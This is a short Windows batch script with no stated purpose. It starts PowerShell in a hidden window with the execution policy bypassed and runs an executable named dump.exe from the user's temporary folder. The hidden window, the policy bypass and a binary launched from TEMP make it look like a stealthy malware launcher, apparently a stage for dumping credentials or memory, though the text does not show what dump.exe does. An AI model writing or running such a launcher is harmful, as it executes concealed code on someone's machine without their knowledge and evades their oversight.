@echo off

start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "try { & \"%TEMP%\dump.exe\" } catch { Write-Host $_.Exception.Message }"
